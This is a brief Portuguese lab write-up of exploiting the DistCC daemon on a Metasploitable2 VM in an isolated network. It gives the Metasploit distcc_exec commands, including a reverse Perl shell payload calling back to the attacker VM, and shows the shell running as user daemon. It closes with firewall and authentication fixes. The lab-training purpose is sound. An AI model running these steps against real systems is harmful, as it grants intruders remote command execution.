# Writeup: DistCC Daemon Command Execution - Metasploitable2

## Ambiente
- Atacante: Kali Linux (VM VirtualBox)
- Alvo: Metasploitable2 (VM VirtualBox)
- Rede: Internal Network isolada (192.168.56.0/24)

## 1. Reconhecimento
Identificado na varredura inicial com Nmap: distccd rodando na
porta 3632/tcp.

## 2. Identificação da vulnerabilidade
O DistCC (ferramenta de compilação distribuída) permite execução
remota de comando quando configurado para aceitar conexões sem
restrição de rede — uma falha de arquitetura/configuração, não
um bug de código.

## 3. Exploração
Uso do módulo do Metasploit Framework:

    use exploit/unix/misc/distcc_exec
    set RHOSTS 192.168.56.10
    set LHOST 192.168.56.11
    exploit

O payload padrão (cmd/unix/reverse_bash) falhou por
incompatibilidade com o /dev/tcp nesse sistema. Resolvido
trocando para payload em Perl:

    set PAYLOAD cmd/unix/reverse_perl
    exploit

Resultado: shell reverso obtido com sucesso.

## 4. Confirmação de acesso
    whoami          -> daemon
    id              -> uid=1(daemon) gid=1(daemon) groups=1(daemon)

## Observação
Diferente das explorações anteriores, o acesso obtido não é
root, mas sim o usuário de sistema "daemon" (privilégios
limitados). Uma etapa adicional de escalação de privilégio
seria necessária para obter root completo.

## Conclusão
Execução remota de comando obtida através de uma falha de
configuração no DistCC. Como correção: nunca expor o daemon
DistCC diretamente à rede sem restrição por firewall, e preferir
alternativas modernas de build distribuído com autenticação.
